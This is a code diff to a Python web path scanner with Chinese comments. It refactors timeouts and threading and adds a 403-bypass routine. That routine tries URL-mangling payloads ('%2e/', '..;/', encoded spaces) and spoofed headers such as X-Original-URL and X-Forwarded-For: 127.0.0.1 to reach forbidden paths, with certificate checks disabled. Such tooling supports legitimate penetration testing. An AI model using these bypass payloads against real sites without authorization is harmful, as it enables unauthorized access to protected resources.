@@ -5,9 +5,9 @@
 import requests
 import asyncio
 from concurrent.futures import ThreadPoolExecutor
-# 忽略警告
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# 禁用安全请求警告
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 import importlib
 from yarl import URL
 import traceback
@@ -24,7 +24,7 @@ from lib.common.connectionPool import conn_pool
 
 
 class Scanner(object):
-    def __init__(self, timeout=600, args=None):
+    def __init__(self, args=None):
 
         self.args = args
         self.start_time = time.time()
@@ -32,7 +32,7 @@ class Scanner(object):
         self.links_limit = 100  # max number of folders to scan
         self._init_rules()
         self._init_scripts()
-        self.timeout = timeout  # 每个目标的最大扫描分钟，默认为10分钟
+        self.timeout = 30 * 60      # 每个目标的最大扫描分钟，因为使用协程，故默认为30分钟,
         self.session = conn_pool()  # 使用连接池
 
         self.url_list = list()  # all urls to scan 任务处理队列
@@ -116,10 +116,9 @@ class Scanner(object):
 
         # todo  当url 类似 http://www.example.com , path:'' , max_depth = 1+5=6
         self.max_depth = cal_depth(self, self.path)[1] + 5
-        if self.args.check404:
-            self._404_status = 404
-        else:
-            self.check_404_existence()
+
+        self.check_404_existence()
+
         if self._404_status == -1:
             logger.log('ALERT', 'HTTP 404 check failed <%s:%s>' % (self.host, self.port))
         elif self._404_status != 404:
@@ -138,12 +137,17 @@ class Scanner(object):
             if not self.session:
                 return -1, {}, ''
 
-            resp = self.session.get(self.base_url + url, allow_redirects=False, timeout=timeout, verify=False)
+            resp = self.session.get(self.base_url + url, allow_redirects=False, headers=setting.default_headers, timeout=timeout, verify=False)
 
             headers = resp.headers
             status = resp.status_code
 
-            if status == 502:    # 502出现3次以上，排除该站点
+            # 403 bypass test
+            if status == 403:
+                self.bypass_403(resp)
+
+            # 502出现3次以上，排除该站点
+            if status == 502:
                 self.status_502_count += 1
                 if self.status_502_count > 3:
                     self.url_list.clear()
@@ -162,7 +166,8 @@ class Scanner(object):
                     headers = resp.headers
                 except Exception as e:
                     logger.log('ERROR', e)
-            # 这里禁止重定向， 但有时，网页重定向后才会有东西
+
+            # 前面禁止重定向， 但有时，网页重定向后才会有东西
             if status == 302:
                 new_url = headers["Location"]
                 if new_url not in self._302_url:
@@ -184,8 +189,78 @@ class Scanner(object):
             logger.log('ERROR', repr(e))
             return -1, {}, ''
         except Exception as e:
-            logger.log('ERROR', f'{repr(e)}   {url}  {self.base_url}')
+            logger.log('ERROR', f'{repr(e)}   {self.base_url + url}')
             return -1, {}, ''
+
+    # 403 绕过
+    def bypass_403(self, resp, timeout=20):
+
+        OriginalUrl = resp.request.path_url
+        Rurl = resp.request.path_url
+
+        if Rurl != "/":
+            Rurl = resp.request.path_url.rstrip("/")
+
+        PreviousPath = '/'.join(str(Rurl).split('/')[:-1])
+        LastPath = str(Rurl).split('/')[-1]
+
+        payloads = ["%2e/" + LastPath, "%2f/" + LastPath, LastPath + "/.", LastPath + "/./.",
+                    LastPath + "/././", LastPath + "/./", "./" + LastPath + "/./", LastPath + "%20/",
+                    LastPath + "%09/", "%20" + LastPath + "%20/", LastPath + "/..;/", LastPath + "..;/",
+                    LastPath + "?", LastPath + "??", LastPath + "???", LastPath + "//", LastPath + "/*",
+                    LastPath + "/*/", "/" + LastPath + "//", LastPath + "/", LastPath + "/.randomstring"]
+
+        hpayloads = [{"X-Rewrite-URL": OriginalUrl}, {"X-Original-URL":  OriginalUrl}, {"Referer": "/" + LastPath},
+                     {"X-Custom-IP-Authorization": "127.0.0.1"}, {"X-Originating-IP": "127.0.0.1"},
+                     {"X-Forwarded-For": "127.0.0.1"}, {"X-Remote-IP": "127.0.0.1"},
+                     {"X-Client-IP": "127.0.0.1"}, {"X-Host": "127.0.0.1"}, {"X-Forwarded-Host": "127.0.0.1"}]
+
+        for p in payloads:
+            url = PreviousPath + "/" + p
+            resp = self.session.get(self.base_url + url, allow_redirects=False, headers=setting.default_headers, timeout=timeout, verify=False)
+            if resp.status_code == 200:
+                if OriginalUrl not in self.results:
+                    self.results[OriginalUrl] = []
+                _ = {'status': resp.status_code, 'url': '%s%s' % (self.base_url, OriginalUrl),
+                     'title': '绕过payload: %s%s' % (self.base_url, url), 'vul_type': "403绕过"}
+                if _ not in self.results[OriginalUrl]:
+                    self.results[OriginalUrl].append(_)
+                break
+
+        for hp in hpayloads:
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
+                "Connection": "close",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+            }
+            key, = hp
+            new_url = ""
+            if key == "X-Original-URL":
+                new_url = Rurl + "4nyth1ng"
+            if key == "X-Rewrite-URL":
+                new_url = "/"
+
+            # Add header
+            headers.update(hp)
+
+            if new_url:
+                url = new_url
+            else:
+                url = OriginalUrl
+
+            resp = self.session.get(self.base_url + url, allow_redirects=False, headers=headers,
+                                    timeout=timeout, verify=False)
+
+            if resp.status_code == 200:
+                if OriginalUrl not in self.results:
+                    self.results[OriginalUrl] = []
+                _ = {'status': resp.status_code, 'url': '%s%s' % (self.base_url, OriginalUrl),
+                     'title': '绕过payload: %s%s, Header payload: %s' % (self.base_url, url, hp), 'vul_type': "403绕过"}
+                if _ not in self.results[OriginalUrl]:
+                    self.results[OriginalUrl].append(_)
+                # print(_)
+                break
+        logger.log('INFOR', f'403 bypass test. {self.base_url + OriginalUrl}')
 
     # 检查状态404是否存在
     def check_404_existence(self):
@@ -422,6 +497,11 @@ class Scanner(object):
                 # ({'prefix': '', 'full_url': '/trace'}, 'Spring boot serverProperties', 200, '', '', True, 'springboot')
                 url_description, tag, status_to_match, content_type, content_type_no, root_only, vul_type = item
                 prefix = url_description['prefix']
+
+                # todo  有点问题
+                # print(url_description)
+                # print('   -----   ')
+                # print(prefix)
                 url = url_description['full_url']
                 '''
                 {sub} 这个是规则里设置的， 主要是根据当前域名来做字典，
@@ -507,9 +587,10 @@ class Scanner(object):
             if platform.system() != "Windows":
                 import uvloop
                 asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
-            p = ThreadPoolExecutor(5)
 
-            tasks = [loop.run_in_executor(p, self.scan_worker, item) for item in self.url_list]
+            t = ThreadPoolExecutor(self.args.t)
+
+            tasks = [loop.run_in_executor(t, self.scan_worker, item) for item in self.url_list]
             # 这一步很重要，使用loop.run_in_executor()函数:内部接受的是阻塞的线程池，执行的函数，传入的参数
             # 即对网站访问10次，使用线程池访问
 
